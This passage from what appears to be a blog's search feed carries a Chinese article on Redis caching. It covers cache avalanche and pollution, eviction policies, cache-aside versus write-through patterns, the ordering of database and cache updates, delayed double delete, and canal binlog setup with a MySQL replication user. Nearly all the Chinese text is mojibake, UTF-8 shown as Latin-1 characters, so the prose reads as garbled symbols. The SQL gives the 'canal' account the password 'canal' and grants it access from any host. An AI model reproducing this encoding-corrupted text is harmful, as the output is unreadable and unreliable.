å¸ƒéš†è¿‡æ»¤å™¨,åœ¨å¯¹æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢å‰,å…ˆé€šè¿‡å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨</li></ol><p>ä¸€èˆ¬æ¥è¯´è¿™ä¸‰ç§æ–¹æ¡ˆæ˜¯<strong>åŒæ—¶ä½¿ç”¨</strong>çš„,ç¬¬ä¸€å±‚ä¸€èˆ¬æ˜¯æ ¡éªŒ,æ‹¦æˆªéƒ¨åˆ†éæ³•ç”¨æˆ·å’Œä¸åˆç†è¯·æ±‚(æ‹¦æˆªä¸å¯èƒ½å…¨éƒ¨æ‹¦æˆªè€Œä¸”å¦‚æœæ”»å‡»è€…é€šè¿‡æŸäº›æ–¹å¼æŒæ¡äº†å¤§é‡åˆæ³•ç”¨æˆ·å‘¢),ç¬¬äºŒå±‚æ˜¯å¸ƒéš†è¿‡æ»¤å™¨,å°½é‡é¿å…å¯¹æ•°æ®åº“çš„ç›´æ¥è®¿é—®,ä½†ä»ç„¶æœ‰è¯¯åˆ¤çš„å¯èƒ½æ€§,ç¬¬ä¸‰å±‚å†ç¼“å­˜ä¸€ä¸ªæ— æ•ˆå€¼,åšåˆ°å°½å¯èƒ½é™ä½é£é™©</p><h3 id="ç¼“å­˜é›ªå´©"><a href="#ç¼“å­˜é›ªå´©" class="headerlink" title="ç¼“å­˜é›ªå´©"></a>ç¼“å­˜é›ªå´©</h3><p>ç¼“å­˜é›ªå´©ä¸€èˆ¬æŒ‡reidsä¸­å¤§æ‰¹é‡æ•°æ®åœ¨æçŸ­æ—¶é—´å†…(åŒæ—¶)è¿‡æœŸ,å¯¼è‡´å¤§é‡çš„æŸ¥è¯¢æ•°æ®åº“</p><p><strong>è§£å†³æ–¹æ¡ˆ:</strong></p><ol><li>åœ¨å­˜å‚¨æ•°æ®æ—¶,è®¾ç½®è¿‡æœŸæ—¶é—´ä¸ºä¸€ä¸ªéšæœºå€¼(ä¹Ÿå¯ä»¥ç†è§£æˆç»™å›ºå®šçš„è¿‡æœŸæ—¶é—´åŠ ä¸Šä¸€ä¸ªéšæœºå€¼,ç±»ä¼¼å¯†ç å­¦ä¸­çš„åŠ ç›),å°½é‡ä¿è¯ä¸ä¼šæœ‰å¤§é‡æ•°æ®åœ¨åŒä¸€æ—¶é—´è¿‡æœŸ</li><li>å°†çƒ­ç‚¹æ•°æ®å°½é‡å‡åŒ€åœ°åˆ†å¸ƒåœ¨ä¸åŒçš„æ•°æ®åº“ä¸­</li><li>å¤šçº§ç¼“å­˜</li><li>è®¾ç½®çƒ­ç‚¹æ•°æ®æ°¸ä¸è¿‡æœŸ(åŒç¼“å­˜å‡»ç©¿ä¸­çš„)</li></ol><h3 id="ç¼“å­˜æ±¡æŸ“"><a href="#ç¼“å­˜æ±¡æŸ“" class="headerlink" title="ç¼“å­˜æ±¡æŸ“"></a>ç¼“å­˜æ±¡æŸ“</h3><p>ç¼“å­˜æ±¡æŸ“æŒ‡çš„æ˜¯ç¼“å­˜ä¸­ä¸€äº›åªä¼šè¢«è®¿é—®ä¸€æ¬¡æˆ–è€…å‡ æ¬¡çš„çš„æ•°æ®,è¢«è®¿é—®å®Œå,å†ä¹Ÿä¸ä¼šè¢«è®¿é—®åˆ°,ä½†è¿™éƒ¨åˆ†æ•°æ®ä¾ç„¶ç•™å­˜åœ¨ç¼“å­˜ä¸­,æ¶ˆè€—ç¼“å­˜ç©ºé—´,ä¹Ÿä¼šåœ¨ä¸€å®šç¨‹åº¦ä¸Šå½±å“redisçš„æ€§èƒ½</p><p>redisç¼“å­˜çš„maxmemoryåº”è¯¥è®¾ç½®å¤šå¤§,è¿™æ˜¯ä¸€ä¸ªå…³ä¹æ€§èƒ½å’Œæˆæœ¬çš„é—®é¢˜,éœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæƒè¡¡,ä½†æ™®éæ¨èçš„æ˜¯è®¾ç½®ä¸ºæ€»æ•°æ®é‡çš„15%-30%(å…¶ä»–åšå®¢éƒ½è¿™ä¹ˆå†™,è€Œä¸”èŒƒå›´è¿˜æŒºå¤§,åº”è¯¥æ²¡ä»€ä¹ˆé—®é¢˜ğŸ¤”)</p><h4 id="ç¼“å­˜æ·˜æ±°ç­–ç•¥"><a href="#ç¼“å­˜æ·˜æ±°ç­–ç•¥" class="headerlink" title="ç¼“å­˜æ·˜æ±°ç­–ç•¥"></a>ç¼“å­˜æ·˜æ±°ç­–ç•¥</h4><p>å®˜æ–¹æ–‡æ¡£å†™äº†8ç§,å¦‚ä¸‹å›¾:<br><img src="https://pb01.s3.bitiful.net/157.png" alt="avatar"></p><ul><li><p>noeviction(ä¸é©±é€,å³ä¸æ·˜æ±°)</p><p>é»˜è®¤ç­–ç•¥,å½“ç¼“å­˜è¾¾åˆ°maxmemoryæ—¶,redisä¼šæ‹’ç»æ‰€æœ‰å†™è¯·æ±‚,å¹¶è¿”å›é”™è¯¯ä¿¡æ¯,æ­¤æ—¶rediså·²ç»è¿›å…¥åªè¯»æ¨¡å¼,æ— æ³•å†è¿›è¡Œå†™æ“ä½œ,ä½†ä»ç„¶å¯ä»¥è¿›è¡Œè¯»æ“ä½œ</p></li><li><p>allkeys-lru<br>æ‰€æœ‰keyé‡‡ç”¨LRUç®—æ³•è¿›è¡Œæ·˜æ±°,å³ä¼˜å…ˆåˆ é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„key</p></li><li><p>allkeys-lfu<br>æ‰€æœ‰keyé‡‡ç”¨LFUç®—æ³•è¿›è¡Œæ·˜æ±°,å³ä¼˜å…ˆåˆ é™¤æœ€ä¸å¸¸ç”¨çš„key</p></li><li><p>volatile-lru<br>åªæ·˜æ±°è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„key,é‡‡ç”¨LRUç®—æ³•è¿›è¡Œæ·˜æ±°</p></li><li><p>volatile-lfu<br>åªæ·˜æ±°è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„key,é‡‡ç”¨LFUç®—æ³•è¿›è¡Œæ·˜æ±°</p></li><li><p>allkeys-random<br>æ‰€æœ‰keyé‡‡ç”¨éšæœºåˆ é™¤</p></li><li><p>volatile-random<br>åªæ·˜æ±°è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„key,é‡‡ç”¨éšæœºåˆ é™¤</p></li><li><p>volatile-ttl<br>åˆ é™¤è¿‡æœŸå­—æ®µè®¾ç½®ä¸ºtrueå’Œå‰©ä½™æœ€çŸ­ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰å€¼çš„å¯†é’¥ã€‚</p></li></ul><h2 id="ç¼“å­˜å’Œæ•°æ®åº“ä¸€è‡´æ€§"><a href="#ç¼“å­˜å’Œæ•°æ®åº“ä¸€è‡´æ€§" class="headerlink" title="ç¼“å­˜å’Œæ•°æ®åº“ä¸€è‡´æ€§"></a>ç¼“å­˜å’Œæ•°æ®åº“ä¸€è‡´æ€§</h2><p>ä¸ç®¡æ˜¯å…ˆå†™MySQLæ•°æ®åº“ï¼Œå†åˆ é™¤Redisç¼“å­˜ï¼›è¿˜æ˜¯å…ˆåˆ é™¤ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“ï¼Œéƒ½æœ‰å¯èƒ½å‡ºç°æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚ä¸¾ä¸€ä¸ªä¾‹å­ï¼šå¦‚æœåˆ é™¤äº†ç¼“å­˜Redisï¼Œè¿˜æ²¡æœ‰æ¥å¾—åŠå†™åº“MySQLï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å°±æ¥è¯»å–ï¼Œå‘ç°ç¼“å­˜ä¸ºç©ºï¼Œåˆ™å»æ•°æ®åº“ä¸­è¯»å–æ•°æ®å†™å…¥ç¼“å­˜ï¼Œæ­¤æ—¶ç¼“å­˜ä¸­ä¸ºè„æ•°æ®ã€‚</p><p>æ›´æ–°ç¼“å­˜æœ‰å››ç§è®¾è®¡æ¨¡å¼: Cache aside, Read through, Write through, Write behind caching</p><h3 id="ç¼“å­˜æ›´æ–°æ¨¡å¼"><a href="#ç¼“å­˜æ›´æ–°æ¨¡å¼" class="headerlink" title="ç¼“å­˜æ›´æ–°æ¨¡å¼"></a>ç¼“å­˜æ›´æ–°æ¨¡å¼</h3><h4 id="Cache-Aside-æ—è·¯ç¼“å­˜"><a href="#Cache-Aside-æ—è·¯ç¼“å­˜" class="headerlink" title="Cache Aside(æ—è·¯ç¼“å­˜)"></a>Cache Aside(æ—è·¯ç¼“å­˜)</h4><ul><li>å¤±æ•ˆï¼šåº”ç”¨ç¨‹åºå…ˆä»cacheå–æ•°æ®ï¼Œæ²¡æœ‰å¾—åˆ°ï¼Œåˆ™ä»æ•°æ®åº“ä¸­å–æ•°æ®ï¼ŒæˆåŠŸåï¼Œæ”¾åˆ°ç¼“å­˜ä¸­ã€‚</li><li>å‘½ä¸­ï¼šåº”ç”¨ç¨‹åºä»cacheä¸­å–æ•°æ®ï¼Œå–åˆ°åè¿”å›ã€‚</li><li>æ›´æ–°ï¼šæ›´æ–°æ•°æ®åº“, æ›´æ–°/åˆ é™¤ç¼“å­˜</li></ul><p><strong>é‚£ä¹ˆåˆ°åº•æ˜¯æ›´æ–°ç¼“å­˜è¿˜æ˜¯åˆ é™¤ç¼“å­˜å‘¢?</strong></p><p>å¦‚æœè¯»çš„é¢‘ç‡é«˜, é€‰æ‹©æ›´æ–°ç¼“å­˜, è¿™æ ·å¯ä»¥æé«˜ç¼“å­˜å‘½ä¸­ç‡</p><p>å¦‚æœå†™çš„é¢‘ç‡é«˜, é€‰æ‹©åˆ é™¤ç¼“å­˜, ç­‰åˆ°è¦è¯»çš„æ—¶å€™å†å†™å…¥ç¼“å­˜, å¯ä»¥å‡å°‘æ— æ•ˆçš„å†™æ“ä½œå’Œå‡å°‘ç¼“å­˜æ•°æ®é‡</p><h4 id="Read-Through-è¯»ç©¿"><a href="#Read-Through-è¯»ç©¿" class="headerlink" title="Read Through(è¯»ç©¿)"></a>Read Through(è¯»ç©¿)</h4><p>Read Through å¥—è·¯å°±æ˜¯åœ¨æŸ¥è¯¢æ“ä½œä¸­æ›´æ–°ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç¼“å­˜å¤±æ•ˆçš„æ—¶å€™ï¼ŒCache Asideæ˜¯ç”±è°ƒç”¨æ–¹è´Ÿè´£æŠŠæ•°æ®åŠ è½½å…¥ç¼“å­˜ï¼Œè€ŒRead Throughåˆ™ç”¨ç¼“å­˜æœåŠ¡è‡ªå·±æ¥åŠ è½½ï¼Œä»è€Œå¯¹åº”ç”¨æ–¹æ˜¯é€æ˜çš„ã€‚</p><h4 id="Write-Through-å†™ç©¿"><a href="#Write-Through-å†™ç©¿" class="headerlink" title="Write Through(å†™ç©¿)"></a>Write Through(å†™ç©¿)</h4><p>Write Through å¥—è·¯å’ŒRead Throughç›¸ä»¿ï¼Œä¸è¿‡æ˜¯åœ¨æ›´æ–°æ•°æ®æ—¶å‘ç”Ÿã€‚å½“æœ‰æ•°æ®æ›´æ–°çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­ç¼“å­˜ï¼Œç›´æ¥æ›´æ–°æ•°æ®åº“ï¼Œç„¶åè¿”å›ã€‚å¦‚æœå‘½ä¸­äº†ç¼“å­˜ï¼Œåˆ™æ›´æ–°ç¼“å­˜ï¼Œç„¶åå†ç”±Cacheè‡ªå·±æ›´æ–°æ•°æ®åº“ï¼ˆè¿™æ˜¯ä¸€ä¸ªåŒæ­¥æ“ä½œï¼‰</p><h4 id="Write-Behind-Caching-å†™å›"><a href="#Write-Behind-Caching-å†™å›" class="headerlink" title="Write Behind Caching(å†™å›)"></a>Write Behind Caching(å†™å›)</h4><p>åœ¨æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œåªæ›´æ–°ç¼“å­˜ï¼Œä¸æ›´æ–°æ•°æ®åº“ï¼Œè€Œæˆ‘ä»¬çš„ç¼“å­˜ä¼šå¼‚æ­¥åœ°æ‰¹é‡æ›´æ–°æ•°æ®åº“ã€‚è¿™ä¸ªè®¾è®¡çš„å¥½å¤„å°±æ˜¯è®©æ•°æ®çš„I/Oæ“ä½œé£å¿«æ— æ¯”ï¼ˆå› ä¸ºç›´æ¥æ“ä½œå†…å­˜å˜› ï¼‰ï¼Œå› ä¸ºå¼‚æ­¥ï¼Œè¿˜å¯ä»¥åˆå¹¶å¯¹åŒä¸€ä¸ªæ•°æ®çš„å¤šæ¬¡æ“ä½œï¼Œæ‰€ä»¥æ€§èƒ½çš„æé«˜æ˜¯ç›¸å½“å¯è§‚çš„ã€‚ä½†æ˜¯ï¼Œå…¶å¸¦æ¥çš„é—®é¢˜æ˜¯ï¼Œæ•°æ®ä¸æ˜¯å¼ºä¸€è‡´æ€§çš„ï¼Œè€Œä¸”å¯èƒ½ä¼šä¸¢å¤±</p><p>ä¸€èˆ¬è€Œè¨€(å³ä¸æ˜¯ç‰¹æ®Šçš„ä¸šåŠ¡åœºæ™¯), æˆ‘ä»¬<strong>é€‰ç”¨Cache Aside(æ—è·¯ç¼“å­˜)æ¨¡å¼</strong>, ä¸‹é¢æˆ‘ä»¬çš„è®¨è®ºä¹ŸåŸºäºæ­¤æ¨¡å¼.</p><h3 id="æ“ä½œç¼“å­˜-amp-æ“ä½œæ•°æ®åº“ï¼Œå“ªä¸ªå…ˆï¼Ÿ"><a href="#æ“ä½œç¼“å­˜-amp-æ“ä½œæ•°æ®åº“ï¼Œå“ªä¸ªå…ˆï¼Ÿ" class="headerlink" title="æ“ä½œç¼“å­˜ &amp; æ“ä½œæ•°æ®åº“ï¼Œå“ªä¸ªå…ˆï¼Ÿ"></a>æ“ä½œç¼“å­˜ &amp; æ“ä½œæ•°æ®åº“ï¼Œå“ªä¸ªå…ˆï¼Ÿ</h3><h4 id="é’ˆå¯¹åˆ é™¤ç¼“å­˜çš„æƒ…å†µï¼š"><a href="#é’ˆå¯¹åˆ é™¤ç¼“å­˜çš„æƒ…å†µï¼š" class="headerlink" title="é’ˆå¯¹åˆ é™¤ç¼“å­˜çš„æƒ…å†µï¼š"></a>é’ˆå¯¹åˆ é™¤ç¼“å­˜çš„æƒ…å†µï¼š</h4><p><strong>å¦‚æœé‡‡ç”¨å…ˆåˆ é™¤ç¼“å­˜ï¼Œåœ¨æ›´æ–°æ•°æ®åº“ï¼Œä¼šæœ‰ä»€ä¹ˆåæœï¼Ÿ</strong></p><ol><li>çº¿ç¨‹Aå…ˆæŠŠç¼“å­˜çš„Aæ•°æ®åˆ é™¤ï¼Œå‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢</li><li>çº¿ç¨‹Bæƒ³è¦è¯»å–Aæ•°æ®ï¼Œå‘ç°ç¼“å­˜å¤±æ•ˆï¼Œä»æ•°æ®åº“è¯»å–Aæ•°æ®ï¼Œå¹¶ä¸”æ›´æ–°ç¼“å­˜ï¼Œ</li><li>åˆ‡æ¢å›çº¿ç¨‹Aï¼Œçº¿ç¨‹Aæ›´æ–°æ•°æ®åº“æ•°æ®ã€‚</li></ol><p>è‡³æ­¤ï¼Œæ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µå·²ç»å‡ºç°ï¼Œæ•°æ®åº“çš„å†™å…¥è¾ƒæ…¢ï¼Œå®¹æ˜“å‡ºç°æ­¤ç°è±¡</p><p><strong>å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜ æ€ä¹ˆæ ·ï¼Ÿ</strong></p><ol><li>çº¿ç¨‹Aè¯»å–ç¼“å­˜Aæ•°æ®ï¼Œå‘ç°ç¼“å­˜å¤±æ•ˆï¼Œæ‰€ä»¥å»æ•°æ®åº“è¯»å–ï¼Œæ­¤æ—¶è¿˜æœªå†™å…¥ç¼“å­˜ï¼Œå‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢</li><li>çº¿ç¨‹Bæ›´æ–°æ•°æ®åº“ï¼Œå¹¶ä¸”åˆ é™¤å¯¹åº”çš„ç¼“å­˜ï¼Œ</li><li>åˆ‡æ¢å›çº¿ç¨‹Aï¼Œçº¿ç¨‹Aå°†è¯»å–åˆ°çš„æ—§å€¼ï¼Œå†™å…¥ç¼“å­˜</li></ol><p>åˆå‡ºç°äº†æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä½†æ˜¯ç›¸æ¯”å…ˆåˆ é™¤ç¼“å­˜ï¼Œå‘ç”Ÿæ¦‚ç‡å°å¾ˆå¤šï¼Œå¿…é¡»<strong>åŒæ—¶æ»¡è¶³</strong>:</p><ul><li>è¯»è¯·æ±‚çš„æ—¶å€™ï¼Œç¼“å­˜åˆšå¥½å¤±æ•ˆ</li><li>è¯»è¯·æ±‚ ä¸ å†™è¯·æ±‚ å¹¶å‘</li></ul><p>æ‰€ä»¥åœ¨å®é™…ä¸­å¾ˆéš¾å‡ºç°è¯·æ±‚ B å·²ç»æ›´æ–°äº†æ•°æ®åº“å¹¶ä¸”åˆ é™¤äº†ç¼“å­˜ï¼Œè¯·æ±‚ A æ‰æ›´æ–°å®Œç¼“å­˜çš„æƒ…å†µã€‚æ‰€ä»¥æ¨èå…ˆ<code>æ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜</code></p><p><strong>è¿˜æ˜¯å­˜åœ¨ä¸ä¸€è‡´çš„å¯èƒ½ï¼Œæ€ä¹ˆå®ç°æœ€ç»ˆçš„ä¸€è‡´æ€§å‘¢ï¼Ÿ</strong></p><ol><li>å»¶è¿ŸåŒåˆ ç­–ç•¥<br>å»¶è¿ŸåŒåˆ ç­–ç•¥æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ•°æ®åº“å­˜å‚¨å’Œç¼“å­˜æ•°æ®ä¿æŒä¸€è‡´æ€§çš„å¸¸ç”¨ç­–ç•¥ï¼Œä½†å®ƒä¸æ˜¯å¼ºä¸€è‡´ã€‚å…¶å®ä¸ç®¡å“ªç§æ–¹æ¡ˆï¼Œéƒ½é¿å…ä¸äº†Rediså­˜åœ¨è„æ•°æ®çš„é—®é¢˜ï¼Œåªèƒ½å‡è½»è¿™ä¸ªé—®é¢˜ï¼Œè¦æƒ³å½»åº•è§£å†³ï¼Œå¾—è¦ç”¨åˆ°åŒæ­¥é”å’Œå¯¹åº”çš„ä¸šåŠ¡é€»è¾‘å±‚é¢è§£å†³ã€‚</li></ol><p>ä¸é‡‡ç”¨å…ˆæ›´æ–°æ•°æ®åº“ï¼Œåœ¨åˆ é™¤ç¼“å­˜çš„æ–¹æ¡ˆ, è€Œæ˜¯ç”¨å…ˆåˆ é™¤ç¼“å­˜ï¼Œå†æ›´æ–°æ•°æ®åº“ï¼Œé‡Œé¢çš„ä¸ä¸€è‡´é—®é¢˜ï¼Œç”¨å»¶è¿ŸåŒåˆ è§£å†³<br>1ã€å…ˆåˆ é™¤ç¼“å­˜ 2ã€å†å†™æ•°æ®åº“ 3ã€ä¼‘çœ 500msï¼ˆç»Ÿè®¡çº¿ç¨‹è¯»å–æ•°æ®å’Œå†™ç¼“å­˜çš„æ—¶é—´ï¼‰ ï¼ˆä¼‘çœ çš„ä½œç”¨æ˜¯å½“å‰çº¿ç¨‹ç­‰å…¶ä»–çº¿ç¨‹è¯»å®Œäº†æ•°æ®åå†™å…¥ç¼“å­˜åï¼Œåˆ é™¤ç¼“å­˜ï¼‰ 4ã€å†åˆ é™¤ç¼“å­˜</p><ol><li>è®¾ç½®è¾ƒçŸ­çš„ç¼“å­˜è¿‡æœŸæ—¶é—´<br>æ²¿ç”¨å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜,å°±ç»™ç¼“å­˜è®¾ç½®ä¸€ä¸ªè¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´(åªè¦å®ƒå¤ŸçŸ­,å°±ä¸å®¹æ˜“è¯»åˆ°é”™è¯¯æ•°æ®)</li></ol><h4 id="é’ˆå¯¹æ›´æ–°ç¼“å­˜çš„æƒ…å†µï¼šï¼ˆé¢è¯•è¯´ä¸Šé¢é‚£ç§å³å¯ï¼‰"><a href="#é’ˆå¯¹æ›´æ–°ç¼“å­˜çš„æƒ…å†µï¼šï¼ˆé¢è¯•è¯´ä¸Šé¢é‚£ç§å³å¯ï¼‰" class="headerlink" title="é’ˆå¯¹æ›´æ–°ç¼“å­˜çš„æƒ…å†µï¼šï¼ˆé¢è¯•è¯´ä¸Šé¢é‚£ç§å³å¯ï¼‰"></a>é’ˆå¯¹æ›´æ–°ç¼“å­˜çš„æƒ…å†µï¼šï¼ˆé¢è¯•è¯´ä¸Šé¢é‚£ç§å³å¯ï¼‰</h4><p><strong>å¦‚æœé‡‡ç”¨å…ˆæ›´æ–°ç¼“å­˜ï¼Œå†æ›´æ–°æ•°æ®åº“</strong></p><ol><li>çº¿ç¨‹Aæ›´æ–°äº†ç¼“å­˜ï¼Œæ­¤æ—¶å‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢</li><li>çº¿ç¨‹Bæ›´æ–°ç¼“å­˜ï¼Œæ›´æ–°æ•°æ®åº“ï¼Œæ­¤æ—¶åˆ‡æ¢å›çº¿ç¨‹A</li><li>çº¿ç¨‹Aæ›´æ–°æ•°æ®åº“</li></ol><p>æ­¤æ—¶å°±å‡ºç°äº†æ•°æ®ä¸ä¸€è‡´çš„ç°è±¡ï¼Œæ•°æ®åº“çš„å†™å…¥è¾ƒæ…¢ï¼Œå®¹æ˜“å‡ºç°æ­¤ç°è±¡ã€‚</p><p><strong>åè¿‡æ¥ï¼Œå…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†æ›´æ–°ç¼“å­˜å‘¢?</strong></p><ol><li>çº¿ç¨‹Aæ›´æ–°äº†æ•°æ®åº“ï¼Œè¿˜æœªå†™å…¥ç¼“å­˜ï¼Œå‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢</li><li>çº¿ç¨‹Bæ›´æ–°äº†æ•°æ®åº“ï¼Œå¹¶ä¸”å†™å…¥ç¼“å­˜ï¼Œæ­¤æ—¶åˆ‡æ¢åˆ°çº¿ç¨‹A</li><li>çº¿ç¨‹AæŠŠç¼“å­˜å†™å…¥ï¼Œè¦†ç›–äº†ä¹‹å‰çº¿ç¨‹Bçš„ç¼“å­˜</li></ol><p>è‡³æ­¤ï¼Œæ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œåˆå‡ºç°äº†ã€‚ç¼“å­˜çš„å†™å…¥é€šå¸¸è¦è¿œè¿œå¿«äºæ•°æ®åº“çš„å†™å…¥ï¼Œæ‰€ä»¥åœ¨å®é™…ä¸­å¾ˆéš¾å‡ºç°è¯·æ±‚ B å·²ç»æ›´æ–°äº†æ•°æ®åº“å¹¶ä¸”æ›´æ–°äº†ç¼“å­˜ï¼Œè¯·æ±‚ A æ‰æ›´æ–°å®Œç¼“å­˜çš„æƒ…å†µã€‚æ‰€ä»¥<code>æ¨èå…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†æ›´æ–°ç¼“å­˜</code></p><h3 id="ä¿è¯æ“ä½œåŸå­æ€§"><a href="#ä¿è¯æ“ä½œåŸå­æ€§" class="headerlink" title="ä¿è¯æ“ä½œåŸå­æ€§"></a>ä¿è¯æ“ä½œåŸå­æ€§</h3><p>æ“ä½œæ•°æ®åº“å’Œæ“ä½œç¼“å­˜å…¶å®æ˜¯ä¸¤ä¸ªæ“ä½œï¼Œå‰é¢çš„æ‰€æœ‰åˆ†æéƒ½æ˜¯å»ºç«‹åœ¨è¿™ä¸¤ä¸ªæ“ä½œéƒ½èƒ½åŒæ—¶æ‰§è¡ŒæˆåŠŸï¼Œåªè¦å‡ºç°ä¸€ä¸ªæ‰§è¡ŒæˆåŠŸï¼Œä¸€ä¸ªæ‰§è¡Œå¤±è´¥çš„æƒ…å†µï¼Œå°±ä¼šé€ æˆæ•°æ®åº“å’Œç¼“å­˜æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œä¼šå¯¹æ•æ„Ÿä¸šåŠ¡é€ æˆå½±å“ã€‚ä¸‹é¢å°±æ˜¯ä¸¤ç§è§£å†³æ–¹æ¡ˆ.</p><h4 id="é˜Ÿåˆ—-é‡è¯•æœºåˆ¶"><a href="#é˜Ÿåˆ—-é‡è¯•æœºåˆ¶" class="headerlink" title="é˜Ÿåˆ—+é‡è¯•æœºåˆ¶"></a>é˜Ÿåˆ—+é‡è¯•æœºåˆ¶</h4><p><img src="https://pb01.s3.bitiful.net/158.png" alt="avatar"></p><ul><li>æ›´æ–°æ•°æ®åº“æ•°æ®ï¼›</li><li>ç¼“å­˜å› ä¸ºç§ç§é—®é¢˜åˆ é™¤å¤±è´¥</li><li>å°†éœ€è¦åˆ é™¤çš„keyå‘é€è‡³æ¶ˆæ¯é˜Ÿåˆ—</li><li>è‡ªå·±æ¶ˆè´¹æ¶ˆæ¯ï¼Œè·å¾—éœ€è¦åˆ é™¤çš„key</li><li>ç»§ç»­é‡è¯•åˆ é™¤æ“ä½œï¼Œç›´åˆ°æˆåŠŸ</li></ul><p>è¯¥æ–¹æ¡ˆæœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œä¼šå¯¹ä¸šåŠ¡çº¿ä»£ç é€ æˆå¤§é‡çš„ä¾µå…¥ã€‚</p><h4 id="åŸºäºè®¢é˜…binlogçš„åŒæ­¥æœºåˆ¶"><a href="#åŸºäºè®¢é˜…binlogçš„åŒæ­¥æœºåˆ¶" class="headerlink" title="åŸºäºè®¢é˜…binlogçš„åŒæ­¥æœºåˆ¶"></a>åŸºäºè®¢é˜…binlogçš„åŒæ­¥æœºåˆ¶</h4><p><img src="https://pb01.s3.bitiful.net/159.png" alt="avatar"></p><p>æœ¬æ–¹æ¡ˆå¯åŠ¨ä¸€ä¸ªè®¢é˜…ç¨‹åºå»è®¢é˜…æ•°æ®åº“çš„binlogï¼Œè·å¾—éœ€è¦æ“ä½œçš„æ•°æ®ã€‚åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œå¦èµ·ä¸€æ®µç¨‹åºï¼Œè·å¾—è¿™ä¸ªè®¢é˜…ç¨‹åºä¼ æ¥çš„ä¿¡æ¯ï¼Œè¿›è¡Œåˆ é™¤ç¼“å­˜æ“ä½œã€‚å…³é”®æ˜¯ä½¿ç”¨canalæ¡†æ¶è®¢é˜…binlog</p><ul><li><p>è¦å¼€å¯mysqlçš„binlogï¼Œéœ€è¦è®¾ç½®binlog_formatä¸ºROWæ¨¡å¼ï¼Œå¹¶ä¸”è®¾ç½®server_idï¼Œä¿è¯å”¯ä¸€æ€§ã€‚ä¿®æ”¹my.cnfé…ç½®æ–‡ä»¶ï¼Œé‡å¯mysqlæœåŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin # å¼€å¯ binlog</span><br><span class="line">binlog-format=ROW # é€‰æ‹© ROW æ¨¡å¼</span><br><span class="line">server_id=1 # é…ç½® MySQL replaction éœ€è¦å®šä¹‰ï¼Œä¸è¦å’Œ canal çš„ slaveId é‡å¤</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æ˜¯å¦ä¿®æ”¹ Binlog æˆåŠŸã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹ binlog æ—¥å¿—æ˜¯å¦å¼€å¯</span></span><br><span class="line">show variables like &#x27;log_%&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>MySQL æ‰§è¡Œ SQL è¯­å¥åˆ›å»º canal å•ç‹¬ä½¿ç”¨çš„è´¦å·ï¼Œç”¨æ¥è¿›è¡Œ Binlog çš„åŒæ­¥å’Œç›‘å¬</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> canal IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;canal&#x27;</span>;  </span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, REPLICATION SLAVE, REPLICATION CLIENT <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;canal&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h4><ol><li><a href="https://coolshell.cn/articles/17416.html" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">ç¼“å­˜æ›´æ–°çš„å¥—è·¯</a></li><li>Javaå…¨æ ˆçŸ¥è¯†ä½“ç³»</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ·å¤–è®¿é—®é˜¿é‡Œäº‘æœåŠ¡å™¨å¤±è´¥</title>
